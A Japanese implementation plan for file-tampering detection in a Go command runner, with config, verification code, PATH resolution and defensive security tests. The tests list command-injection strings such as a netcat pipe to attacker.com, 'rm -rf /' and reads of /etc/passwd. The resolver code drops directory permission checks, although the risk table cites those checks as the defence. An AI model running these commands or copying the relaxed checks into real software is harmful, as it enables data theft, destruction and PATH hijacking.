# 実装計画書: ファイル改ざん検出機能の実装

## 1. 概要

本実装計画書では、ファイル改ざん検出機能の段階的実装について詳細なスケジュールとタスクを定義する。従来の設定ファイル検証に加え、global/groupsレベルでの包括的なファイル改ざん検出と標準システムパススキップ機能を実装する。

## 2. 実装フェーズと優先度

### Phase 1: 基盤機能実装（優先度: 高）
**目標**: 設定ファイル拡張と基本的なデータ構造の実装

### Phase 2: 検証機能実装（優先度: 高）
**目標**: global/groups検証機能の実装とエラーハンドリング

### Phase 3: 統合・テスト（優先度: 高）
**目標**: PATH解決、スキップ機能、包括的テスト

## 3. Phase 1: 基盤機能実装

### 3.1 タスク一覧

- [x] **Task 1.1**: 設定ファイル構造拡張
  - **担当**: 開発者
  - **工数**: 2日
  - **依存**: なし
  - **成果物**: 拡張されたTOML設定構造

- [x] **Task 1.2**: runnertypes.Config 構造体拡張
  - **担当**: 開発者
  - **工数**: 1日
  - **依存**: Task 1.1
  - **成果物**: HashFile型定義、GlobalConfig/GroupConfig拡張

- [x] **Task 1.3**: verification.Manager メソッド拡張
  - **担当**: 開発者
  - **工数**: 3日
  - **依存**: Task 1.2
  - **成果物**: VerifyGlobalFiles/VerifyGroupFiles メソッド

- [x] **Task 1.4**: PathResolver 基本実装
  - **担当**: 開発者
  - **工数**: 2日
  - **依存**: なし
  - **成果物**: パス解決とキャッシュ機能

### 3.2 実装詳細

#### Task 1.1: 設定ファイル構造拡張

```toml
# 拡張後の config.toml
[global]
timeout = 3600
workdir = "/tmp"
log_level = "info"
skip_standard_paths = false  # 新規追加

# global 検証対象ファイル
verify_files = [
    "/usr/bin/systemctl",
    "/etc/ssl/certs/ca-certificates.crt"
]

[[groups]]
name = "system-maintenance"

# groups 検証対象ファイル
verify_files = [
    "/usr/sbin/logrotate",
    "/etc/logrotate.conf"
]

# 既存コマンド（自動的に検証対象）
[[groups.commands]]
cmd = "systemctl"
args = ["status", "nginx"]
```

#### Task 1.2: 構造体定義

```go
// internal/runner/runnertypes/types.go 拡張
type GlobalConfig struct {
    // 既存フィールド
    Timeout     int    `toml:"timeout" json:"timeout"`
    Workdir     string `toml:"workdir" json:"workdir"`
    LogLevel    string `toml:"log_level" json:"log_level"`
    Environment map[string]string `toml:"environment" json:"environment"`

    // 新規追加
    VerifyFiles       []string `toml:"verify_files" json:"verify_files"`
    SkipStandardPaths bool     `toml:"skip_standard_paths" json:"skip_standard_paths"`
}

type GroupConfig struct {
    // 既存フィールド
    Name        string     `toml:"name" json:"name"`
    Description string     `toml:"description" json:"description"`
    Commands    []Command  `toml:"commands" json:"commands"`
    Environment map[string]string `toml:"environment" json:"environment"`

    // 新規追加
    VerifyFiles []string `toml:"verify_files" json:"verify_files"`
}
```

#### Task 1.3: Manager拡張

```go
// internal/verification/manager.go 拡張
func (vm *Manager) VerifyGlobalFiles(globalConfig *runnertypes.GlobalConfig) (*VerificationResult, error) {
    if !vm.IsEnabled() {
        return &VerificationResult{}, nil
    }

    result := &VerificationResult{
        TotalFiles: len(globalConfig.VerifyFiles),
    }

    start := time.Now()
    defer func() {
        result.Duration = time.Since(start)
    }()

    // skip_standard_pathsフラグに基づいてPathResolverを初期化
    vm.pathResolver.skipStandardPaths = globalConfig.SkipStandardPaths

    for _, filePath := range globalConfig.VerifyFiles {
        // 標準パススキップチェック
        if vm.shouldSkipVerification(filePath) {
            result.SkippedFiles = append(result.SkippedFiles, filePath)
            slog.Info("Skipping global file verification for standard system path",
                "file", filePath)
            continue
        }

        // ファイルのパーミッションチェックは行わない（ハッシュ値比較のみ）
        if err := vm.validator.Verify(filePath); err != nil {
            result.FailedFiles = append(result.FailedFiles, filePath)
        } else {
            result.VerifiedFiles++
        }
    }

    if len(result.FailedFiles) > 0 {
        return result, &VerificationError{
            Op: "global",
            Details: result.FailedFiles,
            Err: ErrGlobalVerificationFailed,
        }
    }

    return result, nil
}

func (vm *Manager) VerifyGroupFiles(groupConfig *runnertypes.GroupConfig) (*VerificationResult, error) {
    if !vm.IsEnabled() {
        return &VerificationResult{}, nil
    }

    // 明示的ファイル + コマンドファイル収集
    allFiles := vm.collectVerificationFiles(groupConfig)

    result := &VerificationResult{
        TotalFiles: len(allFiles),
    }

    start := time.Now()
    defer func() {
        result.Duration = time.Since(start)
    }()

    for _, file := range allFiles {
        if vm.shouldSkipVerification(file) {
            result.SkippedFiles = append(result.SkippedFiles, file)
            slog.Info("Skipping verification for standard system path", "file", file)
            continue
        }

        // ファイルのパーミッションチェックは行わない（ハッシュ値比較のみ）
        if err := vm.validator.Verify(file); err != nil {
            result.FailedFiles = append(result.FailedFiles, file)
        } else {
            result.VerifiedFiles++
        }
    }

    if len(result.FailedFiles) > 0 {
        return result, &VerificationError{
            Op: "group",
            Group: groupConfig.Name,
            Details: result.FailedFiles,
            Err: ErrGroupVerificationFailed,
        }
    }

    return result, nil
}
```

### 3.3 Phase 1 検証基準

- [x] TOML設定ファイルが正しく読み込まれる
- [x] HashFile構造体が適切に動作する
- [x] VerifyGlobalFiles/VerifyGroupFiles メソッドが基本動作する
- [x] 既存機能に影響がない
- [x] 基本的なユニットテストが通過する

## 4. Phase 2: 検証機能実装

### 4.1 タスク一覧

- [x] **Task 2.1**: main.go への global 検証統合
  - **担当**: 開発者
  - **工数**: 2日
  - **依存**: Phase 1 完了
  - **成果物**: 起動時 global 検証実装

- [x] **Task 2.2**: runner.executeGroup への groups 検証統合
  - **担当**: 開発者
  - **工数**: 2日
  - **依存**: Task 2.1
  - **成果物**: グループ実行前検証実装

- [x] **Task 2.3**: エラーハンドリング実装
  - **担当**: 開発者
  - **工数**: 1日
  - **依存**: Task 2.2
  - **成果物**: 適切なエラー処理とログ出力

- [x] **Task 2.4**: コマンドパス収集機能
  - **担当**: 開発者
  - **工数**: 2日
  - **依存**: Task 2.2
  - **成果物**: groups.commands からの自動ファイル収集

### 4.2 実装詳細

#### Task 2.1: main.go 統合

```go
// cmd/runner/main.go の変更
func main() {
    // 1. 既存の設定ファイル検証
    if err := verificationManager.VerifyConfigFile(*configPath); err != nil {
        return fmt.Errorf("config verification failed: %w", err)
    }

    // 2. 設定ファイル読み込み
    cfg, err := cfgLoader.LoadConfig(*configPath)
    if err != nil {
        return fmt.Errorf("failed to load config: %w", err)
    }

    // 3. 新規: global ファイル検証
    result, err := verificationManager.VerifyGlobalFiles(&cfg.Global)
    if err != nil {
        slog.Error("Global files verification failed",
            "total_files", result.TotalFiles,
            "verified_files", result.VerifiedFiles,
            "failed_files", result.FailedFiles,
            "error", err.Error())
        return fmt.Errorf("global files verification failed: %w", err)
    }

    slog.Info("Global files verification completed",
        "verified_files", result.VerifiedFiles,
        "duration_ms", result.Duration.Milliseconds())

    // 4. Runner初期化と実行
    runner, err := runner.NewRunnerWithComponents(cfg, cfgLoader.GetTemplateEngine(), verificationManager)
    if err != nil {
        return fmt.Errorf("failed to initialize runner: %w", err)
    }

    return runner.Run()
}
```

#### Task 2.2: executeGroup 統合

```go
// internal/runner/runner.go の変更
func (r *Runner) executeGroup(group *runnertypes.GroupConfig) error {
    // 1. 新規: グループファイル検証
    if r.verificationManager != nil {
        result, err := r.verificationManager.VerifyGroupFiles(group)
        if err != nil {
            slog.Warn("Group file verification failed, skipping group",
                "group", group.Name,
                "total_files", result.TotalFiles,
                "verified_files", result.VerifiedFiles,
                "failed_files", result.FailedFiles,
                "skipped_files", result.SkippedFiles,
                "error", err.Error())
            return nil // エラーを返さずスキップ
        }

        slog.Info("Group file verification completed",
            "group", group.Name,
            "verified_files", result.VerifiedFiles,
            "skipped_files", len(result.SkippedFiles),
            "duration_ms", result.Duration.Milliseconds())
    }

    // 2. コマンド実行ループ（既存処理）
    for _, command := range group.Commands {
        if err := r.executeCommand(&command); err != nil {
            return err
        }
    }

    return nil
}
```

### 4.3 Phase 2 検証基準

- [x] global 検証失敗時にプロセスが終了する
- [x] groups 検証失敗時にグループがスキップされる
- [x] 適切なログが出力される
- [x] エラーメッセージが分かりやすい
- [x] groups.commands からファイルが自動収集される

## 5. Phase 3: 統合・テスト

### 5.1 タスク一覧

- [ ] **Task 3.1**: PathResolver 完全実装
  - **担当**: 開発者
  - **工数**: 3日
  - **依存**: Phase 2 完了
  - **成果物**: スキップ機能付きパス解決

- [ ] **Task 3.2**: 標準パススキップ機能実装
  - **担当**: 開発者
  - **工数**: 2日
  - **依存**: Task 3.1
  - **成果物**: 設定可能なスキップ機能

- [ ] **Task 3.3**: コマンド個別検証機能
  - **担当**: 開発者
  - **工数**: 2日
  - **依存**: Task 3.2
  - **成果物**: VerifyCommandFile メソッド

- [ ] **Task 3.4**: 包括的ユニットテスト作成
  - **担当**: 開発者
  - **工数**: 4日
  - **依存**: Task 3.1-3.3
  - **成果物**: 全機能のユニットテスト

- [ ] **Task 3.5**: 統合テスト作成
  - **担当**: 開発者
  - **工数**: 3日
  - **依存**: Task 3.4
  - **成果物**: エンドツーエンドテスト

- [ ] **Task 3.6**: パフォーマンステスト作成
  - **担当**: 開発者
  - **工数**: 2日
  - **依存**: Task 3.5
  - **成果物**: ベンチマークテスト

- [ ] **Task 3.7**: セキュリティテスト作成
  - **担当**: 開発者
  - **工数**: 2日
  - **依存**: Task 3.5
  - **成果物**: セキュリティ関連テスト

### 5.2 実装詳細

#### Task 3.1: PathResolver 完全実装

```go
// internal/verification/path_resolver.go
type PathResolver struct {
    pathEnv           string
    security          *security.Validator
    cache             map[string]string
    mu                sync.RWMutex
    skipStandardPaths bool
    standardPaths     []string
}

func NewPathResolver(pathEnv string, security *security.Validator, skipStandardPaths bool) *PathResolver {
    return &PathResolver{
        pathEnv:           pathEnv,
        security:          security,
        cache:             make(map[string]string),
        skipStandardPaths: skipStandardPaths,
        standardPaths:     []string{"/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/"},
    }
}

// ディレクトリへのアクセス可能性確認（厳格なパーミッションチェックは行わない）
func (pr *PathResolver) canAccessDirectory(dir string) bool {
    info, err := os.Stat(dir)
    if err != nil {
        return false // ディレクトリが存在しないか、アクセスできない
    }

    return info.IsDir() // ディレクトリであることだけを確認
}

func (pr *PathResolver) ShouldSkipVerification(path string) bool {
    if !pr.skipStandardPaths {
        return false
    }

    for _, standardPath := range pr.standardPaths {
        if strings.HasPrefix(path, standardPath) {
            return true
        }
    }
    return false
}

// コマンドパス解決メソッド（権限チェックなし）
func (pr *PathResolver) ResolvePath(command string) (string, error) {
    // 1. パストラバーサル攻撃の検証
    if err := pr.validateCommandSafety(command); err != nil {
        return "", fmt.Errorf("unsafe command rejected: %w", err)
    }

    // 2. 絶対パスの場合はそのまま返す
    if filepath.IsAbs(command) {
        return command, nil
    }

    // 3. PATH環境変数から解決
    for _, dir := range strings.Split(pr.pathEnv, ":") {
        // 4. ディレクトリアクセス確認（厳格なパーミッションチェックなし）
        if !pr.canAccessDirectory(dir) {
            continue // アクセスできないディレクトリはスキップ
        }

        // 5. コマンドファイル確認
        fullPath := filepath.Join(dir, command)

        if info, err := os.Stat(fullPath); err == nil && !info.IsDir() {
            // ファイルの存在確認のみ
            return fullPath, nil
        }
    }

    return "", fmt.Errorf("command not found in PATH: %s", command)
}
```

#### Task 3.2: スキップ機能統合

```go
// Manager に標準パススキップ機能を統合
func (vm *Manager) shouldSkipVerification(path string) bool {
    return vm.pathResolver.ShouldSkipVerification(path)
}

func (vm *Manager) collectVerificationFiles(groupConfig *runnertypes.GroupConfig) []string {
    var allFiles []string

    // 明示的ファイル
    for _, filePath := range groupConfig.VerifyFiles {
        allFiles = append(allFiles, filePath)
    }

    // コマンドファイル
    for _, command := range groupConfig.Commands {
        resolvedPath, err := vm.pathResolver.Resolve(command.Cmd)
        if err != nil {
            slog.Warn("Failed to resolve command path",
                "command", command.Cmd,
                "error", err.Error())
            continue
        }
        allFiles = append(allFiles, resolvedPath)
    }

    // 重複排除
    return removeDuplicates(allFiles)
}
```

#### Task 3.3: コマンド個別検証

```go
func (vm *Manager) VerifyCommandFile(command string) (*FileVerificationDetail, error) {
    detail := &FileVerificationDetail{
        Path: command,
    }

    start := time.Now()
    defer func() {
        detail.Duration = time.Since(start)
    }()

    // パス解決
    resolvedPath, err := vm.pathResolver.Resolve(command)
    if err != nil {
        detail.Error = err
        return detail, fmt.Errorf("path resolution failed: %w", err)
    }
    detail.ResolvedPath = resolvedPath

    // スキップチェック
    if vm.shouldSkipVerification(resolvedPath) {
        detail.HashMatched = true // スキップは成功扱い
        return detail, nil
    }

    // ハッシュ検証（パーミッションチェックは行わない）
    if err := vm.validator.Verify(resolvedPath); err != nil {
        detail.HashMatched = false
        detail.Error = err
        return detail, fmt.Errorf("command file verification failed: %w", err)
    }

    detail.HashMatched = true
    return detail, nil
}
```

### 5.3 Phase 3 検証基準

- [ ] PATH解決が正しく動作する
- [ ] 標準パススキップが正しく動作する
- [ ] セキュリティ検証が適切に実行される
- [ ] 95%以上のテストカバレッジ
- [ ] すべてのベンチマークテストが通過する
- [ ] セキュリティテストが通過する

## 6. テスト戦略

### 6.1 ユニットテスト

```go
// テストファイル構成
verification/
├── manager_test.go
│   ├─ TestManager_VerifyGlobalFiles_Success
│   ├─ TestManager_VerifyGlobalFiles_Failure
│   ├─ TestManager_VerifyGroupFiles_Success
│   ├─ TestManager_VerifyGroupFiles_PartialFailure
│   └─ TestManager_VerifyCommandFile
├── path_resolver_test.go
│   ├─ TestPathResolver_Resolve_AbsolutePath
│   ├─ TestPathResolver_Resolve_RelativePath
│   ├─ TestPathResolver_Resolve_InsecurePATH
│   ├─ TestPathResolver_ShouldSkipVerification
│   └─ TestPathResolver_Cache
└── integration_test.go
    ├─ TestEndToEnd_FullVerificationFlow
    ├─ TestEndToEnd_GlobalFailure
    └─ TestEndToEnd_GroupFailure
```

### 6.2 パフォーマンステスト

```go
// internal/verification/manager_bench_test.go
func BenchmarkManager_VerifyGlobalFiles(b *testing.B) {
    globalConfig := createTestGlobalConfig(20) // 20ファイル

    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        result, err := vm.VerifyGlobalFiles(globalConfig)
        if err != nil {
            b.Fatal(err)
        }
        if result.VerifiedFiles != 20 {
            b.Fatalf("Expected 20 verified files, got %d", result.VerifiedFiles)
        }
    }
}

func BenchmarkPathResolver_Resolve(b *testing.B) {
    commands := []string{"ls", "cat", "grep", "systemctl", "nginx"}

    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        cmd := commands[i%len(commands)]
        _, err := pathResolver.Resolve(cmd)
        if err != nil {
            b.Fatal(err)
        }
    }
}
```

### 6.3 セキュリティテスト

```go
func TestSecurity_InsecurePATH(t *testing.T) {
    // 悪意のあるPATH設定のテスト
    maliciousPATH := "/tmp/malicious:/usr/bin"
    pathResolver := NewPathResolver(maliciousPATH, security, false)

    // /tmp/malicious ディレクトリが存在しない場合はスキップされる
    mockFS.AddDir("/tmp/malicious", 0777) // テスト用に存在する状態を作る
    mockFS.AddFile("/tmp/malicious/malicious_command", 0755, []byte("malicious code"))

    // パストラバーサルなど他のセキュリティチェックは維持
    _, err := pathResolver.ResolvePath("../../../etc/passwd")
    assert.Error(t, err)
}

func TestSecurity_PathTraversal(t *testing.T) {
    // パストラバーサル攻撃のテスト
    testCases := []string{
        "../../../etc/passwd",
        "../../bin/sh",
        "/tmp/../../../etc/shadow",
    }

    for _, testCase := range testCases {
        _, err := pathResolver.Resolve(testCase)
        assert.Error(t, err, "Should reject path traversal: %s", testCase)
    }
}

func TestSecurity_RealWorldAttackScenarios(t *testing.T) {
    mockFS := common.NewMockFileSystem()

    // 実際の攻撃シナリオをシミュレート
    mockFS.AddDir("/usr/bin", 0755)
    mockFS.AddDir("/tmp", 0777) // 攻撃者が書き込み可能
    mockFS.AddFile("/tmp/malicious", 0755, []byte("malicious binary"))
    mockFS.AddFile("/etc/passwd", 0644, []byte("root:x:0:0:root:/root:/bin/bash"))

    security, _ := security.NewValidatorWithFS(security.DefaultConfig(), mockFS)

    // 攻撃シナリオ1: PATHインジェクション
    // ディレクトリ権限チェックはないが、パストラバーサル対策は維持
    maliciousPATH := "/tmp:/usr/bin"
    pathResolver := NewPathResolver(maliciousPATH, security, false)

    // パストラバーサル攻撃は防止する
    _, err := pathResolver.ResolvePath("../../../etc/passwd")
    assert.Error(t, err)

    // 攻撃シナリオ2: コマンドインジェクション試行
    attackCommands := []string{
        "ls; cat /etc/passwd",
        "ls && rm -rf /",
        "ls | nc attacker.com 1337",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
    }

    for _, cmd := range attackCommands {
        _, err := pathResolver.ResolvePath(cmd)
        assert.Error(t, err, "Should reject command injection attempt: %s", cmd)
    }
}
```

## 7. パフォーマンス目標

### 7.1 性能要件

| 項目 | 目標値 | 測定方法 |
|------|--------|----------|
| global検証時間 | < 100ms | 10ファイル想定 |
| group検証時間 | < 50ms/group | 5ファイル/group想定 |
| PATH解決時間 | < 10ms/command | キャッシュ使用 |
| メモリ使用量増加 | < 5MB | ハッシュキャッシュ含む |
| 起動時間増加 | < 100ms | 全体的な影響 |

### 7.2 最適化戦略

- **キャッシュ活用**: パス解決結果のキャッシュ
- **遅延評価**: groups検証は各グループ実行直前
- **並列処理**: 複数ファイルの検証（将来拡張）
- **早期終了**: 失敗時の即座な処理停止

## 8. リスク管理

### 8.1 技術リスク

| リスク | 影響度 | 対策 |
|--------|--------|------|
| filevalidator パッケージの制約 | 中 | 事前調査済み、既存機能活用 |
| PATH解決の複雑性 | 中 | セキュリティファーストの設計 |
| パフォーマンス影響 | 中 | ベンチマークテストとプロファイリング |
| 既存機能への影響 | 高 | 段階的実装と十分なテスト |

### 8.2 運用リスク

| リスク | 影響度 | 対策 |
|--------|--------|------|
| ハッシュファイル管理の複雑化 | 中 | 詳細な運用ドキュメント作成 |
| 設定更新時の手順増加 | 中 | 自動化ツールの提供 |
| 標準パススキップの誤用 | 中 | デフォルト無効、明示的設定 |

### 8.3 セキュリティリスク

| リスク | 影響度 | 対策 |
|--------|--------|------|
| 標準パススキップの悪用 | 中 | 詳細なログ出力と監視 |
| PATH インジェクション攻撃 | 高 | 厳格なディレクトリ権限チェック |
| ハッシュファイル改ざん | 高 | 完全パス検証とsafefileio使用 |

## 9. 運用考慮事項

### 9.1 デプロイメント手順

```bash
# 1. ハッシュ記録（global ファイル）
sudo ./build/record -file /usr/bin/systemctl -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
sudo ./build/record -file /usr/bin/ls -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes

# 2. ハッシュ記録（groups ファイル）
sudo ./build/record -file /usr/sbin/logrotate -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
sudo ./build/record -file /etc/logrotate.conf -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes

# 3. 設定ファイル更新（hash_files セクション追加）
vi /etc/go-safe-cmd-runner/config.toml

# 4. 動作確認
./runner --config /etc/go-safe-cmd-runner/config.toml
```

### 9.2 設定例

```toml
# 標準パススキップを有効にする場合
[global]
skip_standard_paths = true
verify_files = [
    "/usr/local/bin/custom_tool"  # カスタムツールは検証
]

[[groups]]
name = "custom-group"
verify_files = [
    "/opt/custom/config.conf"  # カスタム設定は検証
]

[[groups.commands]]
cmd = "ls"  # 標準パス、スキップされる
args = ["-la"]

[[groups.commands]]
cmd = "/usr/local/bin/custom_tool"  # カスタムパス、検証される
args = ["--check"]
```

### 9.3 監視とロギング

```go
// ログ出力例
slog.Info("Global files verification completed",
    "verified_files", result.VerifiedFiles,
    "duration_ms", result.Duration.Milliseconds())

slog.Info("Skipping verification for standard system path",
    "group", group.Name,
    "command", command.Cmd,
    "resolved_path", resolvedPath)

slog.Warn("Group file verification failed, skipping group",
    "group", group.Name,
    "failed_file", failedFile,
    "error", err.Error())
```

## 10. 成功基準

### 10.1 機能要件

- [ ] global検証失敗時にプロセスが終了する
- [ ] groups検証失敗時にグループがスキップされる
- [ ] 標準パススキップ機能が正しく動作する
- [ ] PATH解決が安全に実行される
- [ ] 適切なログ出力が行われる

### 10.2 非機能要件

- [ ] 95%以上のテストカバレッジ
- [ ] 性能目標をすべて達成
- [ ] セキュリティテストがすべて通過
- [ ] メモリリークがない
- [ ] 競合状態が発生しない

### 10.3 運用要件

- [ ] 包括的な運用ドキュメント作成
- [ ] デプロイメント手順書作成
- [ ] トラブルシューティングガイド作成
- [ ] 監視項目とアラート定義

## 11. 実装スケジュール

### 11.1 全体スケジュール

```
Phase 1: 基盤機能実装     [Week 1-2]
├─ Task 1.1: 設定拡張    [Day 1-2]
├─ Task 1.2: 構造体拡張  [Day 3]
├─ Task 1.3: Manager拡張 [Day 4-6]
└─ Task 1.4: PathResolver [Day 7-8]

Phase 2: 検証機能実装     [Week 3-4]
├─ Task 2.1: main統合    [Day 9-10]
├─ Task 2.2: group統合   [Day 11-12]
├─ Task 2.3: エラー処理  [Day 13]
└─ Task 2.4: ファイル収集 [Day 14-15]

Phase 3: 統合・テスト     [Week 5-7]
├─ Task 3.1: PathResolver完成 [Day 16-18]
├─ Task 3.2: スキップ機能    [Day 19-20]
├─ Task 3.3: 個別検証       [Day 21-22]
├─ Task 3.4: ユニットテスト  [Day 23-26]
├─ Task 3.5: 統合テスト     [Day 27-29]
├─ Task 3.6: パフォーマンス  [Day 30-31]
└─ Task 3.7: セキュリティ   [Day 32-33]
```

### 11.2 マイルストーン

- **M1**: Phase 1 完了 - 基本的な設定拡張と構造体定義
- **M2**: Phase 2 完了 - global/groups検証機能実装
- **M3**: Phase 3 完了 - 包括的なテストと最適化完了

## 12. 完了後のアクション

### 12.1 モニタリング

- 検証機能の使用状況監視
- エラー発生率とパターンの追跡
- パフォーマンス影響の継続測定
- 標準パススキップ使用率の監視

### 12.2 保守計画

- 四半期ごとの機能レビュー
- セキュリティアップデートの適用
- ユーザーフィードバックの収集と対応
- 新しいLinuxディストリビューションへの対応

### 12.3 将来拡張への準備

- ハッシュキャッシュ機能の設計
- 並列検証機能の実装検討
- 動的ライブラリ検証機能の設計
- 設定テンプレート機能の検討
